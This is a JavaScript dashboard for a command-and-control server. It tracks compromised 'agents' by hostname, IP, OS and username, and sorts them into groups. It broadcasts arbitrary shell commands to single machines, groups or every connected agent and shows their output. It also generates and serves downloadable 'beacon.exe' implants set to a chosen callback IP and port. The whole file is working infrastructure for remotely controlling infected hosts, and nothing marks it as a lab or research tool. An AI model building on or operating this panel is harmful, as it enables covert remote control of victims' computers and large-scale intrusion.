const app = {
    agents: [],
    groups: [],
    currentView: 'dashboard',
    selectedTarget: null,
    commandHistory: JSON.parse(localStorage.getItem('nexus_command_history') || '{}'),

    init() {
        this.bindNavigation();
        this.bindModal();
        this.bindLogout();
        this.bindQuickCommand();
        this.bindTerminal();
        this.bindGroupCreate();
        this.bindSearch();
        this.setupWebSocket();
        this.loadInitialData();
    },

    bindNavigation() {
        document.querySelectorAll('.nav-item[data-view]').forEach(item => {
            item.addEventListener('click', (e) => {
                e.preventDefault();
                const view = item.dataset.view;
                this.switchView(view);
            });
        });
    },

    switchView(view) {
        document.querySelectorAll('.nav-item[data-view]').forEach(i => i.classList.remove('active'));
        document.querySelector(`[data-view="${view}"]`).classList.add('active');

        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.getElementById(`${view}View`).classList.add('active');

        document.getElementById('viewTitle').textContent =
            view.charAt(0).toUpperCase() + view.slice(1);

        this.currentView = view;

        if (view === 'agents') this.renderAgentsTable();
        if (view === 'groups') this.loadGroups();
        if (view === 'terminal') this.updateTargetSelectors();
        if (view === 'payload') this.loadBeacons();
    },

    bindModal() {
        const modal = document.getElementById('modal');
        modal.querySelector('.modal-close').addEventListener('click', () => {
            modal.classList.remove('active');
        });
        modal.addEventListener('click', (e) => {
            if (e.target === modal) modal.classList.remove('active');
        });
    },

    showModal(title, content) {
        const modal = document.getElementById('modal');
        document.getElementById('modalTitle').textContent = title;
        document.getElementById('modalBody').innerHTML = content;
        modal.classList.add('active');
    },

    closeModal() {
        document.getElementById('modal').classList.remove('active');
    },

    bindLogout() {
        document.getElementById('logoutBtn').addEventListener('click', async (e) => {
            e.preventDefault();
            await fetch('/c2/api/auth.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'logout' })
            });
            window.location.href = '/c2/logout.php';
        });
    },

    bindQuickCommand() {
        document.getElementById('quickSendBtn').addEventListener('click', () => {
            const target = document.getElementById('quickTarget').value;
            const command = document.getElementById('quickCommand').value;

            if (!target || !command) return;

            const [targetType, targetId] = target.split(':');
            ws.sendCommand(targetId, targetType, command);
            document.getElementById('quickCommand').value = '';
        });
    },

    bindTerminal() {
        const input = document.getElementById('terminalInput');
        const output = document.getElementById('terminalOutput');
        const dropdown = document.getElementById('terminalTargetDropdown');
        const trigger = document.getElementById('terminalTargetTrigger');
        const hiddenInput = document.getElementById('terminalTarget');

        trigger.addEventListener('click', () => {
            dropdown.classList.toggle('open');
        });

        document.addEventListener('click', (e) => {
            if (!dropdown.contains(e.target)) {
                dropdown.classList.remove('open');
            }
        });

        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                const command = input.value.trim();
                if (!command) return;

                const target = hiddenInput.value;
                if (!target) {
                    this.addTerminalLine('Select a target first', 'system');
                    return;
                }

                this.addTerminalLine(command, 'command');

                const [targetType, targetId] = target.split(':');
                ws.sendCommand(targetId, targetType, command, (result) => {
                    this.addTerminalLine(result.result || result.error || 'No output',
                        result.error ? 'error' : 'result');
                });

                input.value = '';
            }
        });

        document.getElementById('clearTerminal').addEventListener('click', () => {
            output.innerHTML = '';
            const target = hiddenInput.value;
            if (target) {
                delete this.commandHistory[target];
                this.saveCommandHistory();
            }
        });
    },

    selectTerminalTarget(value, label) {
        const dropdown = document.getElementById('terminalTargetDropdown');
        const trigger = document.getElementById('terminalTargetTrigger');
        const hiddenInput = document.getElementById('terminalTarget');

        hiddenInput.value = value;
        trigger.querySelector('span').textContent = label;
        dropdown.classList.remove('open');

        document.querySelectorAll('#terminalTargetOptions .custom-select-option').forEach(opt => {
            opt.classList.toggle('selected', opt.dataset.value === value);
        });

        this.loadTerminalHistory();
    },

    loadTerminalHistory() {
        const output = document.getElementById('terminalOutput');
        const target = document.getElementById('terminalTarget').value;
        output.innerHTML = '';

        if (target && this.commandHistory[target]) {
            this.commandHistory[target].forEach(item => {
                const line = document.createElement('div');
                line.className = `terminal-line ${item.type}`;
                line.textContent = item.text;
                output.appendChild(line);
            });
            output.scrollTop = output.scrollHeight;
        }
    },

    saveCommandHistory() {
        localStorage.setItem('nexus_command_history', JSON.stringify(this.commandHistory));
    },

    addTerminalLine(text, type) {
        const output = document.getElementById('terminalOutput');
        const target = document.getElementById('terminalTarget').value;

        const line = document.createElement('div');
        line.className = `terminal-line ${type}`;
        line.textContent = text;
        output.appendChild(line);
        output.scrollTop = output.scrollHeight;

        if (target && type !== 'system') {
            if (!this.commandHistory[target]) {
                this.commandHistory[target] = [];
            }
            this.commandHistory[target].push({ text, type });
            if (this.commandHistory[target].length > 100) {
                this.commandHistory[target] = this.commandHistory[target].slice(-100);
            }
            this.saveCommandHistory();
        }
    },

    bindGroupCreate() {
        document.getElementById('createGroupBtn').addEventListener('click', () => {
            this.showCreateGroupModal();
        });
    },

    showCreateGroupModal() {
        const colors = ['#00d4ff', '#7b2cbf', '#00ff88', '#ffaa00', '#ff4466', '#ff6b9d'];
        const colorOptions = colors.map(c =>
            `<span class="color-option" style="background:${c}" data-color="${c}"></span>`
        ).join('');

        this.showModal('Create Group', `
            <form class="modal-form" id="createGroupForm">
                <div class="form-group">
                    <label>Group Name</label>
                    <input type="text" name="name" class="text-input" required>
                </div>
                <div class="form-group">
                    <label>Description</label>
                    <input type="text" name="description" class="text-input">
                </div>
                <div class="form-group">
                    <label>Color</label>
                    <div class="color-picker">${colorOptions}</div>
                    <input type="hidden" name="color" value="#00d4ff">
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn-secondary" onclick="app.closeModal()">Cancel</button>
                    <button type="submit" class="btn-primary">Create</button>
                </div>
            </form>
        `);

        document.querySelectorAll('.color-option').forEach(opt => {
            opt.addEventListener('click', () => {
                document.querySelectorAll('.color-option').forEach(o => o.classList.remove('selected'));
                opt.classList.add('selected');
                document.querySelector('[name="color"]').value = opt.dataset.color;
            });
        });
        document.querySelector('.color-option').classList.add('selected');

        document.getElementById('createGroupForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(e.target);
            await fetch('/c2/api/groups.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'create',
                    name: formData.get('name'),
                    description: formData.get('description'),
                    color: formData.get('color')
                })
            });
            this.closeModal();
            this.loadGroups();
        });
    },

    bindSearch() {
        document.getElementById('agentSearch').addEventListener('input', (e) => {
            this.renderAgentsTable(e.target.value);
        });
    },

    setupWebSocket() {
        ws.on('connected', () => this.loadInitialData());

        ws.on('agentConnected', (agent) => {
            const existing = this.agents.findIndex(a => a.id === agent.id);
            if (existing >= 0) {
                this.agents[existing] = { ...this.agents[existing], ...agent, status: 'online' };
            } else {
                this.agents.push({ ...agent, status: 'online' });
            }
            this.updateUI();
        });

        ws.on('agentDisconnected', (agentId) => {
            const agent = this.agents.find(a => a.id === agentId);
            if (agent) {
                agent.status = 'offline';
                agent.last_seen = new Date().toISOString();
            }
            this.updateUI();
        });

        ws.on('agentList', (agents) => {
            this.agents = agents;
            this.updateUI();
        });

        ws.on('commandResult', (data) => {
            this.updateStats();

            // Handle Group Command Output
            if (this.currentView === 'groups' && this.selectedGroupId) {
                const groupAgents = this.agents.filter(a => a.group_id == this.selectedGroupId);
                const agent = groupAgents.find(a => a.id === data.agent_id);

                if (agent) {
                    const output = document.getElementById('groupCommandOutput');
                    if (output) {
                        const agentName = agent.hostname || agent.id;
                        const resultText = data.result || data.error || 'No output';
                        output.innerHTML += `<div class="cmd-result"><span style="color:var(--text-muted);font-weight:bold;">[${this.escapeHtml(agentName)}]</span> <span style="white-space:pre-wrap;">${this.escapeHtml(resultText)}</span></div>`;
                        output.scrollTop = output.scrollHeight;
                    }
                }
            }
        });

        ws.connect();
    },

    async loadInitialData() {
        await Promise.all([
            this.loadAgents(),
            this.loadGroups(),
            this.updateStats()
        ]);
    },

    async loadAgents() {
        try {
            const res = await fetch('/c2/api/agents.php?action=list');
            const data = await res.json();
            this.agents = data.agents || [];
            this.updateUI();
        } catch (e) { }
    },

    async loadGroups() {
        try {
            const res = await fetch('/c2/api/groups.php?action=list');
            const data = await res.json();
            this.groups = data.groups || [];
            this.renderGroups();
            this.updateStats();
        } catch (e) { }
    },

    async updateStats() {
        const online = this.agents.filter(a => a.status === 'online').length;
        const offline = this.agents.filter(a => a.status !== 'online').length;

        document.getElementById('onlineCount').textContent = online;
        document.getElementById('offlineCount').textContent = offline;
        document.getElementById('groupCount').textContent = this.groups.length;

        try {
            const res = await fetch('/c2/api/commands.php?action=list&limit=1000');
            const data = await res.json();
            document.getElementById('commandCount').textContent = data.commands?.length || 0;
        } catch (e) { }
    },

    updateUI() {
        this.renderRecentAgents();
        this.updateTargetSelectors();
        if (this.currentView === 'agents') this.renderAgentsTable();
        this.updateStats();
    },

    renderRecentAgents() {
        const container = document.getElementById('recentAgentsList');
        const recent = [...this.agents].slice(0, 5);

        if (recent.length === 0) {
            container.innerHTML = `
                <div class="empty-state">
                    <p>No agents connected yet</p>
                </div>
            `;
            return;
        }

        container.innerHTML = recent.map(agent => `
            <div class="agent-item" data-id="${agent.id}">
                <span class="agent-status ${agent.status}"></span>
                <div class="agent-info">
                    <div class="agent-hostname">${this.escapeHtml(agent.hostname || 'Unknown')}</div>
                    <div class="agent-meta">${this.escapeHtml(agent.ip || '')} • ${this.escapeHtml(agent.os || '')}</div>
                </div>
            </div>
        `).join('');
    },

    renderAgentsTable(filter = '') {
        const tbody = document.getElementById('agentsTableBody');
        let agents = this.agents;

        if (filter) {
            const f = filter.toLowerCase();
            agents = agents.filter(a =>
                (a.hostname && a.hostname.toLowerCase().includes(f)) ||
                (a.ip && a.ip.toLowerCase().includes(f)) ||
                (a.os && a.os.toLowerCase().includes(f))
            );
        }

        if (agents.length === 0) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="8" class="empty-state">No agents found</td>
                </tr>
            `;
            return;
        }

        tbody.innerHTML = agents.map(agent => `
            <tr>
                <td><span class="badge ${agent.status}">${agent.status}</span></td>
                <td>${this.escapeHtml(agent.hostname || 'Unknown')}</td>
                <td>${this.escapeHtml(agent.ip || '-')}</td>
                <td>${this.escapeHtml(agent.os || '-')}</td>
                <td>${this.escapeHtml(agent.username || '-')}</td>
                <td>
                    ${agent.group_name ?
                `<span class="group-badge" style="background:${agent.group_color}20;color:${agent.group_color}">${this.escapeHtml(agent.group_name)}</span>` :
                '<span style="color:var(--text-muted)">None</span>'
            }
                </td>
                <td>${this.formatTime(agent.last_seen)}</td>
                <td>
                    <button class="action-btn" onclick="app.showAgentActions('${agent.id}')" title="Actions">
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="1"/><circle cx="12" cy="5" r="1"/><circle cx="12" cy="19" r="1"/>
                        </svg>
                    </button>
                </td>
            </tr>
        `).join('');
    },

    renderGroups() {
        const container = document.getElementById('groupsGrid');

        if (this.groups.length === 0) {
            container.innerHTML = `
                <div class="groups-empty-msg">No groups created yet</div>
            `;
            return;
        }

        container.innerHTML = this.groups.map(group => `
            <div class="group-card ${this.selectedGroupId == group.id ? 'active' : ''}" onclick="app.selectGroup(${group.id})">
                <span class="group-name">${this.escapeHtml(group.name)}</span>
            </div>
        `).join('');
    },

    updateTargetSelectors() {
        const options = ['<option value="">Select Target</option>'];
        let customHtml = '';

        options.push('<optgroup label="All Agents">');
        options.push('<option value="all:all">All Connected Agents</option>');
        options.push('</optgroup>');

        customHtml += '<div class="custom-select-group">All Agents</div>';
        customHtml += '<div class="custom-select-option indent" data-value="all:all" onclick="app.selectTerminalTarget(\'all:all\', \'All Connected Agents\')">All Connected Agents</div>';

        if (this.groups.length > 0) {
            options.push('<optgroup label="Groups">');
            customHtml += '<div class="custom-select-group">Groups</div>';
            this.groups.forEach(g => {
                options.push(`<option value="group:${g.id}">${this.escapeHtml(g.name)}</option>`);
                customHtml += `<div class="custom-select-option indent" data-value="group:${g.id}" onclick="app.selectTerminalTarget('group:${g.id}', '${this.escapeHtml(g.name)}')">${this.escapeHtml(g.name)}</div>`;
            });
            options.push('</optgroup>');
        }

        const onlineAgents = this.agents.filter(a => a.status === 'online');
        if (onlineAgents.length > 0) {
            options.push('<optgroup label="Online Agents">');
            customHtml += '<div class="custom-select-group">Online Agents</div>';
            onlineAgents.forEach(a => {
                const label = this.escapeHtml(a.hostname || a.id);
                options.push(`<option value="agent:${a.id}">${label}</option>`);
                customHtml += `<div class="custom-select-option indent" data-value="agent:${a.id}" onclick="app.selectTerminalTarget('agent:${a.id}', '${label}')">${label}</div>`;
            });
            options.push('</optgroup>');
        }

        const html = options.join('');
        document.getElementById('quickTarget').innerHTML = html;
        document.getElementById('terminalTargetOptions').innerHTML = customHtml;
    },

    showAgentActions(agentId) {
        const agent = this.agents.find(a => a.id === agentId);
        if (!agent) return;

        const groupOptions = this.groups.map(g =>
            `<option value="${g.id}" ${agent.group_id == g.id ? 'selected' : ''}>${this.escapeHtml(g.name)}</option>`
        ).join('');

        this.showModal(`Agent: ${agent.hostname || agentId}`, `
            <div class="modal-form">
                <div class="form-group">
                    <label>Assign to Group</label>
                    <select class="select-input" id="agentGroupSelect">
                        <option value="">No Group</option>
                        ${groupOptions}
                    </select>
                </div>
                <div class="modal-actions">
                    <button class="btn-secondary" onclick="app.deleteAgent('${agentId}')">Delete Agent</button>
                    <button class="btn-primary" onclick="app.updateAgentGroup('${agentId}')">Save</button>
                </div>
            </div>
        `);
    },

    async updateAgentGroup(agentId) {
        const groupId = document.getElementById('agentGroupSelect').value;
        await fetch('/c2/api/agents.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'update_group',
                agent_id: agentId,
                group_id: groupId || null
            })
        });
        this.closeModal();
        this.loadAgents();
        this.loadGroups();
    },

    async deleteAgent(agentId) {
        if (!confirm('Delete this agent?')) return;
        await fetch('/c2/api/agents.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'delete',
                agent_id: agentId
            })
        });
        this.closeModal();
        this.loadAgents();
    },

    async deleteGroup(groupId) {
        if (!confirm('Delete this group?')) return;
        await fetch('/c2/api/groups.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'delete',
                id: groupId
            })
        });
        this.selectedGroupId = null;
        this.loadGroups();
    },

    selectedGroupId: null,

    selectGroup(groupId) {
        this.selectedGroupId = groupId;
        this.renderGroups();
        this.loadGroupDetail();
    },

    closeGroupDetail() {
        this.selectedGroupId = null;
        const panel = document.getElementById('groupDetailPanel');
        panel.classList.remove('maximized');
        document.getElementById('groupDetailName').textContent = 'Select a Group';
        document.getElementById('groupAgentsList').innerHTML = '';
        document.getElementById('groupCommandOutput').innerHTML = '';

        // Show empty state, hide content
        document.getElementById('groupEmptyState').style.display = 'flex';
        document.getElementById('groupContent').style.display = 'none';

        // Reset maximize icon
        document.getElementById('maximizeGroupBtn').innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <polyline points="15 3 21 3 21 9"></polyline>
            <polyline points="9 21 3 21 3 15"></polyline>
            <line x1="21" y1="3" x2="14" y2="10"></line>
            <line x1="3" y1="21" x2="10" y2="14"></line>
        </svg>`;
    },

    toggleGroupMaximize() {
        const panel = document.getElementById('groupDetailPanel');
        const btn = document.getElementById('maximizeGroupBtn');
        const isMax = panel.classList.toggle('maximized');

        btn.innerHTML = isMax ?
            `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <polyline points="4 14 10 14 10 20"></polyline>
                <polyline points="20 10 14 10 14 4"></polyline>
                <line x1="14" y1="10" x2="21" y2="3"></line>
                <line x1="3" y1="21" x2="10" y2="14"></line>
            </svg>` :
            `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <polyline points="15 3 21 3 21 9"></polyline>
                <polyline points="9 21 3 21 3 15"></polyline>
                <line x1="21" y1="3" x2="14" y2="10"></line>
                <line x1="3" y1="21" x2="10" y2="14"></line>
            </svg>`;
    },

    loadGroupDetail() {
        const group = this.groups.find(g => g.id === this.selectedGroupId);
        if (!group) return;

        // Hide empty state, show content
        document.getElementById('groupEmptyState').style.display = 'none';
        document.getElementById('groupContent').style.display = 'flex';

        document.getElementById('groupDetailName').textContent = group.name;

        // Add delete button to actions
        const actions = document.querySelector('.group-detail-actions');
        actions.innerHTML = `
            <button class="btn-ghost" onclick="app.deleteGroup(${group.id})" title="Delete Group" style="color:var(--status-offline);margin-right:10px;">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
                </svg>
                Delete
            </button>
            <button class="btn-ghost" onclick="app.toggleGroupMaximize()" id="maximizeGroupBtn">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <polyline points="15 3 21 3 21 9"></polyline>
                    <polyline points="9 21 3 21 3 15"></polyline>
                    <line x1="21" y1="3" x2="14" y2="10"></line>
                    <line x1="3" y1="21" x2="10" y2="14"></line>
                </svg>
            </button>
        `;

        const groupAgents = this.agents.filter(a => a.group_id == this.selectedGroupId);
        const agentsList = document.getElementById('groupAgentsList');

        if (groupAgents.length === 0) {
            agentsList.innerHTML = '<span style="color:var(--text-muted);font-size:12px;">No agents in this group</span>';
        } else {
            agentsList.innerHTML = groupAgents.map(a => `
                <div class="group-agent-item">
                    <span class="agent-name">
                        <span class="agent-status ${a.status}"></span>
                        ${this.escapeHtml(a.hostname || a.id)}
                    </span>
                    <button class="remove-btn" onclick="app.removeAgentFromGroup('${a.id}')" title="Remove from group">×</button>
                </div>
            `).join('');
        }

        const availableAgents = this.agents.filter(a => a.group_id != this.selectedGroupId);
        const addSelect = document.getElementById('addAgentToGroup');
        addSelect.innerHTML = '<option value="">+ Add Agent...</option>' +
            availableAgents.map(a => `<option value="${a.id}">${this.escapeHtml(a.hostname || a.id)}</option>`).join('');

        addSelect.onchange = () => {
            if (addSelect.value) {
                this.addAgentToSelectedGroup(addSelect.value);
                addSelect.value = '';
            }
        };
    },

    async addAgentToSelectedGroup(agentId) {
        await fetch('/c2/api/agents.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'update_group',
                agent_id: agentId,
                group_id: this.selectedGroupId
            })
        });
        await this.loadAgents();
        await this.loadGroups();
        this.loadGroupDetail();
    },

    async removeAgentFromGroup(agentId) {
        await fetch('/c2/api/agents.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'update_group',
                agent_id: agentId,
                group_id: null
            })
        });
        await this.loadAgents();
        await this.loadGroups();
        this.loadGroupDetail();
    },

    sendGroupCommand() {
        const command = document.getElementById('groupCommandInput').value.trim();
        if (!command || !this.selectedGroupId) return;

        const output = document.getElementById('groupCommandOutput');
        output.innerHTML = '<span style="color:var(--accent);">> ' + this.escapeHtml(command) + '</span>\n';

        ws.sendCommand(this.selectedGroupId, 'group', command);
        // Results handled by 'commandResult' listener

        document.getElementById('groupCommandInput').value = '';
    },

    formatTime(datetime) {
        if (!datetime) return 'Never';
        const dt = new Date(datetime);
        const now = new Date();
        const diff = Math.floor((now - dt) / 1000);

        if (diff < 60) return diff + 's ago';
        if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
        if (diff < 86400) return Math.floor(diff / 3600) + 'h ago';
        return Math.floor(diff / 86400) + 'd ago';
    },

    async buildPayload() {
        const ip = document.getElementById('payloadIp').value || '127.0.0.1';
        const port = document.getElementById('payloadPort').value || '8080';
        const btn = document.getElementById('buildBtn');
        const status = document.getElementById('buildStatus');

        btn.disabled = true;
        btn.textContent = 'Building...';
        status.innerHTML = '<div class="status-building"><span class="spinner-big"></span></div>';

        try {
            const res = await fetch('/c2/api/payload.php?action=build', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, port })
            });
            const data = await res.json();

            if (data.success) {
                status.innerHTML = '<span class="status-success" style="font-size:24px;color:var(--success);">✓</span>';
                this.loadBeacons();
            } else {
                status.innerHTML = '<span class="status-error">✗ ' + (data.error || 'Build failed') + '</span>';
            }
        } catch (e) {
            status.innerHTML = '<span class="status-error">✗ Build failed</span>';
        }

        btn.disabled = false;
        btn.textContent = 'Generate beacon.exe';
    },

    async loadBeacons() {
        try {
            const res = await fetch('/c2/api/payload.php?action=list');
            const data = await res.json();
            const container = document.getElementById('beaconList');

            if (!data.payloads || data.payloads.length === 0) {
                container.innerHTML = '<div class="beacon-empty">No beacons generated yet</div>';
                return;
            }

            container.innerHTML = data.payloads.map(p => `
                <div class="beacon-item">
                    <div class="beacon-info">
                        <span class="beacon-name">${this.escapeHtml(p.name)}</span>
                        <span class="beacon-meta">${this.formatSize(p.size)} • ${p.created}</span>
                    </div>
                    <div class="beacon-actions">
                        <button class="action-btn" onclick="app.downloadBeacon('${p.name}')" title="Download">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                                <polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
                            </svg>
                        </button>
                        <button class="action-btn" onclick="app.deleteBeacon('${p.name}')" title="Delete">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
                            </svg>
                        </button>
                    </div>
                </div>
            `).join('');
        } catch (e) { }
    },

    downloadBeacon(name) {
        window.location.href = '/c2/api/payload.php?action=download&name=' + encodeURIComponent(name);
    },

    async deleteBeacon(name) {
        if (!confirm('Delete ' + name + '?')) return;
        try {
            await fetch('/c2/api/payload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'delete', name: name })
            });
        } catch (e) { }
        this.loadBeacons();
    },

    formatSize(bytes) {
        if (bytes < 1024) return bytes + ' B';
        if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
        return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    },

    escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    },

    // Server Control Functions
    async checkServerStatus() {
        try {
            const response = await fetch('/c2/api/server.php?action=status');
            const data = await response.json();
            this.updateServerUI(data.running);
        } catch (e) {
            this.updateServerUI(false);
        }
    },

    updateServerUI(running) {
        const indicator = document.getElementById('serverIndicator') || document.querySelector('.server-indicator');
        const statusText = document.getElementById('serverStatusText');
        const stopBtn = document.getElementById('serverStopBtn');
        const restartBtn = document.getElementById('serverRestartBtn');

        if (indicator) {
            indicator.classList.remove('online', 'offline', 'loading');
            indicator.classList.add(running ? 'online' : 'offline');
        }

        if (statusText) {
            statusText.textContent = running ? 'Online' : 'Offline';
            statusText.classList.remove('online', 'offline', 'loading');
            statusText.classList.add(running ? 'online' : 'offline');
        }

        // Stop only works when running, Restart always works
        if (stopBtn) stopBtn.disabled = !running;
        if (restartBtn) restartBtn.disabled = false;
    },

    setServerLoading(loading) {
        const indicator = document.getElementById('serverIndicator') || document.querySelector('.server-indicator');
        const statusText = document.getElementById('serverStatusText');
        const buttons = document.querySelectorAll('.btn-server');

        if (indicator) {
            indicator.classList.remove('online', 'offline');
            if (loading) {
                indicator.classList.add('loading');
            }
        }

        if (statusText && loading) {
            statusText.textContent = 'Starting...';
            statusText.classList.remove('online', 'offline');
            statusText.classList.add('loading');
        }

        buttons.forEach(btn => btn.disabled = loading);
    },

    async startServer() {
        this.setServerLoading(true);
        try {
            const response = await fetch('/c2/api/server.php?action=start');
            const data = await response.json();

            if (data.success) {
                this.updateServerUI(true);
                // Give WebSocket time to connect
                setTimeout(() => {
                    if (window.wsManager) {
                        wsManager.connect();
                    }
                }, 1000);
            } else {
                alert('Failed to start server: ' + data.message);
                this.updateServerUI(false);
            }
        } catch (e) {
            alert('Error starting server');
            this.updateServerUI(false);
        }
    },

    async stopServer() {
        this.setServerLoading(true);
        try {
            const response = await fetch('/c2/api/server.php?action=stop');
            const data = await response.json();

            if (data.success) {
                this.updateServerUI(false);
            } else {
                alert('Failed to stop server: ' + data.message);
                this.checkServerStatus();
            }
        } catch (e) {
            alert('Error stopping server');
            this.checkServerStatus();
        }
    },

    async restartServer() {
        this.setServerLoading(true);
        try {
            const response = await fetch('/c2/api/server.php?action=restart');
            const data = await response.json();

            if (data.success) {
                this.updateServerUI(true);
                setTimeout(() => {
                    if (window.wsManager) {
                        wsManager.connect();
                    }
                }, 1500);
            } else {
                alert('Failed to restart server: ' + data.message);
                this.checkServerStatus();
            }
        } catch (e) {
            alert('Error restarting server');
            this.checkServerStatus();
        }
    }
};

document.addEventListener('DOMContentLoaded', () => {
    app.init();
    app.checkServerStatus();
    // Periodically check server status
    setInterval(() => app.checkServerStatus(), 30000);
});
